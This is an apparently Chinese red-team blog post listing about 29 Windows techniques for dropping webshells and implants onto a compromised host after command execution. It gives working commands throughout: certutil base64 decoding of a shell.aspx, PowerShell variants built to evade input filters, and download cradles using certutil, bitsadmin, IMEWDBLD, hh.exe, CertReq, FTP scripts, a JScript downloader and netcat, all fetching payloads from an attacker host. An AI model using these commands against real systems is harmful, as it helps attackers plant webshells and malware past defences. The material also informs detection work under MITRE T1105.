> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkzNTUwNTg2Ng==&mid=2247485534&idx=1&sn=965510532c48f2610001136d57f67e79

#  Windows命令执行场景下落地文件的常见方法  
 HW专项行动小组   2025-07-02 07:11  
  
**前言**  
  
  
在渗透和攻防场景下，我们经常需要用到落地文件的技巧，比方说一个最经典的场景，当我们通过SQL Server的注入点获取到一个命令执行点时，除了使用无文件落地上线C2的技巧，我们还可以设法落地一个免杀马去上线，在知道绝对路径的情况下，还可以设法落地一个webshell，这样会让我们后续的各种操作方便不少。在部分极端场景，比如不出网的场景，落地Webshell几乎是必须的。（题外话，就上述讨论的场景，还可以用CLR去打内存马，不过这就和本文讨论的场景无关了）  
  
  
为了解决这样的问题，本文尝试总结一些出网和不出网场景下落地马子或Webshell的手法。  
  
  
  
**1.使用echo写入字符串（不出网）**  
  
  
  
  
相信这个大家都会吧  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSro2DrziceGlIpLY5sajKBMvycfAJtDBNbxJgtibrKrAsuhuhLzReMesNA/640?wx_fmt=png&from=appmsg "")  
  
一个是覆盖写入，两个是追加写入。这个就不多说了，比较简单。  
  
  
  
  
**2.使用echo+certutil写入字符串（不出网）**  
  
  
echo是最常见的落地文件、写入内容的姿势，但是有个小小的问题，那就是如果我们要写入的内容里有大量的特殊字符（比方说我们要写webshell）。又或者，我们要落地exe之类的马子，又该怎么办呢？这里我们可以和certutil的base64解码功能组合使用。例如下图这个文件：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSr8ibz0wWTz9r7KfrqKdrpicxUGPn24yfTQicu60gcA4bCX4Iia3APe6wjJQ/640?wx_fmt=png&from=appmsg "")  
  
我们运行certutil -encode 要处理的文件 结果存放文件  
  
比如：  
  
certutil -encode shell.aspx out.txt  
  
这样，就可以把我们想写入的文件转化成base64编码形式（你要落地exe或者别的乱七八糟的文件也按这个步骤）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrMn7Ir9hO8Gne5S3m1l9ZB4fIp8d9nZWibtHYJdEkZmq4306z5ICIA3g/640?wx_fmt=png&from=appmsg "")  
  
然后我们就得到了shell.aspx文件的base64字符串  
  
（有换行不用管，整理成一行就行）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrhLZDV7MS5tG4x1AApwCfzuOSyYmNU2pBMW0kNCLxHTYicUnBicaWicaJQ/640?wx_fmt=png&from=appmsg "")  
  
假设我们需要落地这个shell.aspx文件，只需要用echo将上述字符串写入目标机器的文件中：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrPZHDc7ptcM3fWM1xy5jxcvzlo3oAdceo1TicrfAVCibo2ibTbczkGnficw/640?wx_fmt=png&from=appmsg "")  
  
然后再使用certutil的decode参数即可完成解码，恢复回源文件：  
  
certutil -decode 要解码的文件 解码后文件名  
  
  
比如：  
  
certutil -decode abc.txt shell.aspx  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSr1CPibJhE7UYibuZ8BUyWMG86QE7XM0HDj7UmQHamqTkdgDkZpPOn3wnQ/640?wx_fmt=png&from=appmsg "")  
  
这样，即可无损落地文件。  
  
  
此外，由于certutil在解码base64的时候会无视换行，所以比较长的内容可以分段慢慢写：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSr3RTy7hvJlDHxCiaccdn8sbLuPrsM1FicX1gGnIvBJk2uftLISx19BeRA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrmRYib5y0CnYkTmxWS0qFOBmuorayxh37XBtJ6gvAvcImOA2YQGLnHNg/640?wx_fmt=png&from=appmsg "")  
  
（如上图，换行并不影响）  
  
此外还有一个解码模式是-decodehex 十六进制解码，留给读者自己摸索吧  
  
  
  
**3.使用powershell写入字符串其一（不出网）**  
  
  
上面我们就介绍了最经典的echo写入字符串以及利用certutil实现base64解码，但是有一个小问题。假设在代码层面设置了输入检测，禁止你使用>符号怎么办？笔者曾在某个攻防项目中遇到过类似的问题，目标系统使用JAVA开发，存在一个过滤器检测所有输入内容，一旦检测到输入< >字符，则直接拦截请求（应该是对抗XSS的规则，但阴差阳错中阻止了我们的写文件操作）。  
  
  
在这种情况下，我们可以使用powershell去写入字符串，不会出现>符号，命令如下：  
  
powershell -Command "echo 'aaa' | Out-File -FilePath 'aaa.txt'"  //单引号可省略  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSricHjtWNCQUqmaFD5kIzKGG6SXCfvJzUNFVreibAyGBrOaJIt4Tk48JKg/640?wx_fmt=png&from=appmsg "")  
  
结合我们前面提到的base64编码解码的技巧也就可以正常落地文件了。  
  
  
  
**4.使用powershell写入字符串其二（不出网）**  
  
  
上面我们使用powershell去进行字符串写入，规避掉了echo和>等关键字，但是我们又引入了新的关键字，管道符|、双引号”以及横杠-  
  
  
在某些命令执行拦截规则中，很有可能过滤管道符|，部分XSS规则可能会把”也过滤，秉着送佛送到西的原则，我研究了一下powershell的一些手册和用法，最后捣鼓出一个超简化版的写入字符命令：  
  
powershell -Command Add-Content  
 -Path output.txt   
-Value Hello  
  
//Path参数即为你要写入的文件名，Value为要写入的内容  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrmpfREoVyAib72b3kXKJZ0ibazp0uCgPjALVGX6IZ7Vic9s7cTy8jyQtnw/640?wx_fmt=png&from=appmsg "")  
  
此外Add-Content可以简写为ac  
  
  
因此实际上还可以写成下面这样：  
  
powershell -Command ac   
-Path output.txt   
-Value Hello  
  
  
当然我们可以进一步压缩优化成下面这样：  
  
powershell -Command ac output.txt Hello  
  
总之，上述命令最终优化到只用到一个横杠，应该是较优版本了，大部分常见漏洞的payload里都不会出现-，因此应该不会被一些乱七八糟的规则误杀，可以规避掉绝大部分规则对特殊字符的拦截，看看各位powershell大手子能不能捣鼓出连-都不用的方法。  
  
  
  
**5.使用certutil落地文件（出网）**  
  
  
既然写字符我们是从echo这个典中典的命令开始介绍，那落地文件我们也从certutil这个最经典的开始介绍。  
  
Certutil下载文件的常见命令如下：  
  
certutil -urlcache -split -f http://ip/artifact.exe  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrHQyerPIg8b1iaQnGFdpLKKiaFcQJdva2NGT5bdwhbcicicYV9bJTusXuaQ/640?wx_fmt=png&from=appmsg "")  
  
也可以下载回来后重命名：  
  
certutil -urlcache -split -f http://ip/imashell.txt   
shell.exe  //标红的为重命名后文件名  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrG24EnWf73iarf7OUwWsXToN4KUZddoVTdVOKaOCL8DbwSF34ZOtxy9Q/640?wx_fmt=png&from=appmsg "")  
  
当然，围绕certutil实际上展开了非常多攻防对抗，在目标主机但凡有个正常杀软的情况下，直接运行上述命令去落地几乎不可能成功，因此需要对上述落地语句进行各种变形，例如插入各种特殊字符混淆语句，再比如把certutil复制到别的文件夹并重命名等等，由于本文并不研究certutil绕过杀软，因此这里不展开了，感兴趣的读者进一步搜索相关资料即可。  
  
  
  
  
**6.使用Powershell+System.Net.WebClient落地文件 （出网）**  
  
  
我们强大的powers  
hell也是支持从远端下载文件的，并且方法还不少。最经典的莫过于使用System.Net.WebClient去落地文件：  
  
   
  
powershell (new-object System.Net.WebClient).DownloadFile('http://ip/imashell.txt',  
'shell.txt')  
  
//标红的即为重命名后的文件名  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrjNHmnGZ9N86gQbfb17GZ10PoSr4q9luQmAo5icVSNicvHBWcBzibjI8Ww/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
**7.使用Powershell+BitsTransfer落地文件 （出网）**  
  
  
  
  
不多说了，直接给命令吧：  
  
powershell.exe -Command "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://ip/imashell.txt' -Destination './shell.txt'"  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrYXBvnkFh9tKRNgeAfGaqCDxjvJIe2XCuIOqE4oDHW1GnlOjbT87rpQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
**8.使用Powershell+Invoke-WebRequest.落地文件 （出网）**  
  
  
同样给出命令如下：  
  
powershell.exe -Command "Invoke-WebRequest -Uri 'http://ip/imashell.txt' -OutFile './  
shell.txt'"  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrlbOHo147nOe0t2gjdf88nltA9hqgoficXbZT7qtZibH5Jq81XL8CBdkg/640?wx_fmt=png&from=appmsg "")  
  
此外比较有意思的一点在于，这个Invoke-WebRequest可以直接缩写为iwr，后面还会提到一个Invoke-RestMethod，可以缩写为iwm，我怀疑是不是Powershell所有Invoke-打头的都可以这么缩写  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrC56ibSGicjvIGKHCibeRicwO71tiaYhEKCQ594htiawebv2qw5TjFQqvPvnQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
**9.使用Powershell+Wget落地文件（出网）**  
  
  
  
  
没错，Powershell里也有一个同名的wget command，玩法如下：  
  
powershell -Command "wget 'http://ip/imashell.txt' -OutFile './shell.txt'"  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrXAUyKIYCCPgLcGEdAvVOsO26dJ075ibIDZ0Cg9RKKszsrHUYDwVLWmw/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
**10.使用Powershell+Invoke-RestMethod**  
  
  
  
  
命令如下：  
  
powershell.exe -Command "Invoke-RestMethod -Uri 'http://ip/imashell.txt' -OutFile './shell.txt'"  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrFiaZwp9qwQqZyv0jUTX3dDBZ8ictxOpWJNIhGV9T7gicyZjzHQ33JM59Q/640?wx_fmt=png&from=appmsg "")  
  
（Invoke-RestMethod可以缩写为irm）  
  
上面我们就介绍完了用Powershell进行文件落地的几种姿势，仅作为抛砖引玉之用，感兴趣的读者还可以找找别的powershell的用法进行文件落地。  
  
  
  
  
**11. 使用Bitsadmin落地文件（出网）**  
  
  
  
  
给出命令如下：  
  
  
bitsadmin /transfer n http://ip/imashell.txt   
C:\test\shell.txt  
  
//注意后边必须写绝对路径  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrFv5SNNsQIM6wTh1dPibtt13jiapAEqeWC6ibfIU32s7nWoicQhN6GMCFibQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
**12. 使用imewdbld落地文件（出网）**  
  
  
这个姿势知道的人应该相对少点，免杀效果也稍好一点，就是利用起来没这么舒服。命令如下：  
  
C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE http://ip/imashell.txt  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrCuEN5ibsfhiaJqxibbEzvYo2lRmZiabAJPXfU87qIRUGc8k2jVQKFdZFhQ/640?wx_fmt=png&from=appmsg "")  
  
执行之后会出现一个弹窗报错，并且我们会发现这个文件并不在当前目录下，那么它会在哪呢？我们需要用一个命令去搜索：  
  
  
forfiles /P "%localappdata%\Microsoft\Windows\INetCache" /S /M * /C "cmd /c echo @path"  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrbNrCmRd63t2srQhtWhua4EgpTiahd4WINW7ZZwze5iaPgLaID3ibnMGzQ/640?wx_fmt=png&from=appmsg "")  
  
一般会保存在  
  
C:\Users\S0l4Num\AppData\Local\Microsoft\Windows\INetCache\IE\ 这个目录下，如果你的命令执行环境不允许你执行上述那样复杂的搜索命令，也可以尝试直接在这个目录下面去慢慢翻。  
  
然后imewdbld还可能出现在下面这些文件夹里：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSr7ydpk3XFukTPGWc7O7MQ8pNHtxJeFaxYK17ibV0cz8Yc716icjwEgaQQ/640?wx_fmt=png&from=appmsg "")  
  
下面我们会介绍一大波类似的玩意，都是落地在缓存文件夹，按照上述方法去找就行，就不再展示细节了，感兴趣的师傅可以自己再尝试找找windows上还有没有类似的  
  
  
  
**13. 使用Mspub.exe落地文件（出网）**  
  
  
  
  
说是windows10自带，但我本地没有，似乎是依赖office套件，这玩意的用法和上面的imewdbld类似。  
  
mspub.exe https://ip/imashell.txt  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSra4HibLvNVficrCFFN6GicD92R9IyvBCvWuED2R8iaL4lRedTyuE6zFMskg/640?wx_fmt=png&from=appmsg "")  
  
  
偷网上的截图，这玩意也是保存在这个INetCache文件夹  
  
  
  
  
**14.使用ConfigSecurityPolicy.exe落地文件（出网）**  
  
  
  
  
这个是Defender的文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrmxuvu6X7y3GkDGw3uQyPU5HibOSUKswrZyicAvvnlUOpKuJZYWXgLM8g/640?wx_fmt=png&from=appmsg "")  
  
ConfigSecurityPolicy.exe https://ip/imashell.txt  
  
也是下载文件并保存在INetCache\IE缓存文件夹  
  
  
  
  
**15.使用Installutil.exe落地文件（出网）**  
  
  
  
  
这个是.NET环境中的文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSr9fdwvLXj9NsQczxbVu4ckOW8Rf0roD4e8L0Q9ZdFQVshiblY39LgONQ/640?wx_fmt=png&from=appmsg "")  
  
Installutil.exe https://ip/imashell.txt  
  
同样落地在INetCache\IE缓存文件夹，win7则落地在Microsoft\Windows\Temporary Internet Files缓存文件夹  
  
  
  
  
  
16. 利用Prese**n**tationhost.exe落地文件（出网）  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSr4BJDIXX4VugqDXuGejKbiaSibibiaJTzbT1szHZFFQ3snQicYd39LTQoQqw/640?wx_fmt=png&from=appmsg "")  
  
Presentationhost.exe https://ip/imashell.txt  
  
同样落地在INetCache\IE缓存文件夹，win7则落地在Microsoft\Windows\Temporary Internet Files缓存文件夹  
  
  
  
  
**17. 利用Xwizard.exe落地文件（出网）**  
  
  
  
  
这个稍微有点不一样  
  
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z https://ip/imashell.txt  
  
同样落地在INetCache\IE缓存文件夹，win7则落地在Microsoft\Windows\Temporary Internet Files缓存文件夹，但这个我本地没有复现成功  
  
  
  
  
**18.利用Hh.exe落地文件（出网）**  
  
  
这个我和网上的利用思路有点点不一样，网上说用这玩意可以执行ps1，也可以落地exe，但是我本地尝试用它落地exe的时候会这样：  
  
hh.exe http://ip/nc.exe  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSreIPnibXzt6BXvENriaVPnCfTffYg9IkUcL50US0brXs4zibmpaibypL4qQ/640?wx_fmt=png&from=appmsg "")  
  
接下来有意思的来了，先使用上述命令尝试下载exe的，**然后这里无论点击运行、保存还是取消都没关系。**  
  
接着我们运行hh.exe http://ip/imashell.txt  
  
会弹出一个这个：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSr2qibeLcSz1stx6Qtuia3LWSea3MWoKgY2UJ3XDPW3icYUia1Ibtq2yEQGQ/640?wx_fmt=png&from=appmsg "")  
  
然后这时候看缓存文件夹，文件已经落地到缓存文件夹了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrUkibzWUqJbOY6A5BHRp3pamLbW05AUDAHVwbgJZibj4UotEQknibNkq6Q/640?wx_fmt=png&from=appmsg "")  
  
这个思路挺好玩，误打误撞发现的  
  
  
  
**19.使用desktopimgdownldr.exe落地文件（出网）**  
  
  
如果你当前是普通用户，使用如下命令来下载远程文件：  
  
set "SYSTEMROOT=C:\ProgramData" && cmd /c desktopimgdownldr.exe /lockscreenurl:http://  
url/xxx.exe /eventName:desktopimgdownldr  
  
  
如果你是管理员，则使用如下命令：  
  
set "SYSTEMROOT=C:\ProgramData\" && cmd /c desktopimgdownldr.exe /lockscreenurl:https:/  
/url/file.exe /eventName:desktopimgdownldr && reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP /f  
  
（没复现成功，网上说是落地文件并修改锁屏）  
  
  
  
**20.用curl落地文件（出网）**  
  
  
这个似乎在Windows 10环境下会有，其它版本的Windows不确定，看运气吧，如果有则使用下面的命令：  
  
curl http://ip/imashell.txt -o ./shell.txt  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSr3KwvANwt62T6aC3kJhHlyGRRkWPBcbR5J1ADVXGDiaRG1J1SY7TLzIQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
**21. 使用CertReq落地文件（出网）**  
  
  
  
  
也是系统自带的好工具。给出命令如下：  
  
  
CertReq -Post -config   
https://ip/imashell.txt c:\windows\win.ini   
shell.txt  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrVoYSwHAVahFhSWiaZtODSPYQBO4rtdaSWIwYAePlcApGgGTWJmpibbicw/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
**22.通过FTP落地文件（FTP协议出网）**  
  
  
听起来像是个不太通用的技巧，但还算挺通用的，首先我们需要在自己的VPS上开一个FTP服务，然后在其中放上想落地的文件，比如我把这个nc目录设为FTP服务，其中放一个imashell.txt  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrWET5Qf8qhoicY9xMvprt23nLy1J63JuiaNyqPpWTPFQDn1VTGiatVibH8g/640?wx_fmt=png&from=appmsg "")  
  
然后怎么落地呢？用过FTP的朋友都知道，FTP连接和下载东西都是交互式的，一般的命令执行点肯定做不到交互式，所以要把操作都写在bat里，我们落地一个test.txt文件内容如下：  
  
open  
 ip  //这里写你FTP服务器IP  
  
user  
 username password  //这里写FTP用户名和密码  
  
binary  
  
get   
ftp服务器中要落地的文件名  
  
Bye  
  
//我们要先落地这个文件，这些是FTP指令，幸好这个内容还是比较简单的！使用的时候记得删掉这些注释  
  
例如：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrMHmk4eC9k9WL0fVBFH6pBicobibcPP2iciaCgyOYac6qnMCA4XHJF9HBKA/640?wx_fmt=png&from=appmsg "")  
  
然后运行如下命令：  
  
ftp -n -s:test.txt  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrY95yJjEgDo3pXicspvk7SmKtOHEDHJ0e9Whd0WfWx6orUneNStwsRPw/640?wx_fmt=png&from=appmsg "")  
  
这样就可以在非交互式的环境中利用ftp去落地文件，也算是有应用空间吧，万一目标不允许HTTP出网，但FTP可以呢。  
  
另外这里槽点巨多，网上有些教你用这玩意落地文件的教程，里面给出的FTP命令是有问题的，运行那玩意会直接报错，根本没法用，害我捣鼓了几分钟FTP指令用法。**然后落地完之后记得删掉test.txt文件，然后赶紧关掉你的FTP服务器，避免被大黑阔爆菊。**  
  
这是Windows自带的FTP，可以直接用的，网上的一些文章里还提到一个Tftp，不过似乎不是默认就有的，我也不确定这玩意是不是广泛存在，这里就不写了。  
  
  
  
**23.通过js落地文件**  
  
  
Windows自带cscript可以执行js脚本，所以我们可以先落地一个js下载器，内容如下：  
  
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");  
  
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);  
  
WinHttpReq.Send();  
  
BinStream = new ActiveXObject("ADODB.Stream");  
  
BinStream.Type = 1;  
  
BinStream.Open();  
  
BinStream.Write(WinHttpReq.ResponseBody);  
  
BinStream.SaveToFile("  
shell.txt");  
  
  
保存为down.js  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrDrmvMYsZxg1E0kZh4o0ARGhkhHmNIicaOGQpENDq52UMic9nyrvib1RKg/640?wx_fmt=png&from=appmsg "")  
  
这个思路可以拓展，可以自己捣鼓一下vbs或者bat版本的文件下载器，然后先落地文件下载器，然后再用文件下载器下载大文件  
  
  
  
**24.使用finger.exe落地文件**  
  
  
  
  
略麻烦，需要搞一个专门的darkfinger端，详情可移步：  
  
https://油管/watch?v=cfbwS6zH7ks  
  
  
  
  
  
**25.使用wget落地文件（出网）**  
  
  
前面我们介绍了powershell的wget，这里再介绍另一个适用于Windows的wget，这玩意不是默认安装的，不过在实战中遇到过一些用惯了linux的运维也会在windows上装这玩意，所以遇到的概率相对还是比较高。我本机上之前做实验也装过，这里直接演示：  
  
 wget http://ip/imashell.txt -O "  
shell.txt"  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSru7jJOnPT9Om9aS4sDHSMPpqlHssInsiaZ6dJKEhvJjnU9lCjDdEjRnA/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
**26.使用nc落地文件（出网）**  
  
  
这玩意也不是默认有的，不过同上面介绍的wget，有些运维就是爱用，这玩意也可以帮助落地文件  
  
在要落地文件的机器上执行如下命令：  
  
nc -l -p 12345 > received_file.txt  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrdSAymyICjC5Wl0aibAghWcU1C0mpGwEmveqDkmGvDbeK3ZOib4MrhguA/640?wx_fmt=png&from=appmsg "")  
  
我们自己的VPS执行如下命令：  
  
Nc 目标IP 12345 <  
 shell.txt   //shell即为要发送的文件  
  
运行完这个命令后稍等一会结束掉本机进程，对面就能拿到文件了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrGWU0jh6M15NK1ficmlOXt0x9eOrco5RpcHSm6eaGKMFjwqfOA1icFXPA/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
**27.通过常见语言环境（出网）**  
  
  
这种情况我单独把它归为一类，其实也很好理解，很多服务器都会装Python、java之类的环境，再比如你打进一个PHP站点，那他服务器肯定有php环境。以python为例，如果我们有文件写入条件，可以先写入一个简单的下载器：  
  
import urllib2  
  
u = urllib2.urlopen('http://ip/imashell.txt')  
  
localfile = open('imashell.txt','w')  
  
localfile.write(u.read())  
  
localfile.close()  
  
然后用python运行这个下载器，当然这样在我看来有点多此一举，这个思路也比较通用，看目标系统上有啥语言环境就相应去用就行了  
  
  
  
**28.利用winscp落地文件（出网）**  
  
  
Winscp也算是比较常见的工具，如果有这玩意也可以借助这玩意落地文件，我电脑上没有，就不截图演示了，网上文章给出的利用方法如下：  
  
#上传  
  
winscp.exe /console /command "option batch continue" "option confirm off" "open sftp://bypass:abc123!@192.168.28.131:22" "option transfer binary" "put D:\1.txt  /tmp/" "exit" /log=log_file.txt  
  
#下载  
  
winscp.exe /console /command "option batch continue" "option confirm off" "open sftp://bypass:abc123!@192.168.28.131:22" "option transfer binary" "get /tmp D:\test\app\" "exit" /log=log_file.tx  
  
  
  
**29.使用浏览器落地文件（出网）**  
  
  
这个思路也很有意思，师傅们都知道用浏览器打开一个URL，当我们访问的是不能被解析的文件时，这个文件会被直接下载回来（也就是所谓的不解析）  
  
因此我们可以利用这个细节去落地文件，比如edge的msedge_proxy.exe  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrY1aMx54SibV463xAOibZywyKc6gKdT7O4Et19we4icFg9aazIBic3p3wYQ/640?wx_fmt=png&from=appmsg "")  
  
"C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe" http://ip/imashell.asdasd  
  
需要把要下载的文件设置为一个不会在浏览器解析的文件名，运行上述命令会打开edge并下载文件：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SpFfMmvE6EpfDwtrqZ5F2NhjOHdRlSSrFXfUpUfV3zyy6ojp6fZdZ1S5QhGY8mlsdcLAHxO78XmgDPFYWIYYBw/640?wx_fmt=png&from=appmsg "")  
  
默认下载路径在  
  
C:\Users\用户名\Downloads  
  
还有很多浏览器可以利用  
  
  
//edge下载：  
  
start msedge http://192.168.18.1:88/ca.rar  
  
  
//chrome下载：  
  
start chrome http://192.168.1.1:19900/demo.rar  
  
  
//firefox下载：  
  
start firefox http://192.168.1.1:19900/demo.rar  
  
  
//ie下载（高版本ie经测试不会自动下载，低版本未知）：  
  
start iexplore http://192.168.1.1:19900/demo.rar  
  
  
//360浏览器下载：  
  
start 360se http://192.168.1.1:19900/demo.rar  
  
  
//360极速浏览器下载：  
  
start 360chrome http://192.168.1.1:19900/demo.rar  
  
  
//qq浏览器下载：  
  
start qqbrowser.exe http://192.168.1.1:19900/demo.rar  
  
  
//Opera浏览器下载：  
  
start opera.exe http://192.168.1.1:19900/demo.rar  
  
  
然后去C:\Users\当前用户名\Downloads\看看有没有下载成功  
  
  
  
**结语**  
  
  
常见且比较实用的主要就上面这些，如果读者搜索类似的内容，其实还可以看到一些姿势，比如cmdl32、Mshta、Msiexec、rundll32、regsvr32等等。这些在我看来更类似无文件落地上线的姿势，而并非前文描述的落地文件的场景，因此本文并未给出，感兴趣的读者可以移步阅读下面的参考文章。此外关于落地文件，攻击矩阵中的T1105就是类似行为，比较符合本文中的场景，其中还收录了很多可利用的系统文件，不过其中很多我没有复现成功，有些又只有少数windows版本才可以利用，因此也没收录进本文，感兴趣的师傅也可以进一步阅读研究。  
  
参考文章：  
  
https://www.jianshu.com/p/a404bc7a5154  //windows自带下载  
  
https://developer.aliyun.com/article/1221451  //后渗透之windows中远程下载文件tips  
  
https://www.cnblogs.com/liujunjun/p/14718354.html  //Windows命令行文件下载方式汇总  
  
https://detection.fyi/sigmahq/sigma/windows/process_creation/  //攻击矩阵，可搜索download关键词寻找类似方法  
  
https://attack.mitre.org/techniques/T1105/  //T1105攻击矩阵，落地工具相关行为  
  
  
  
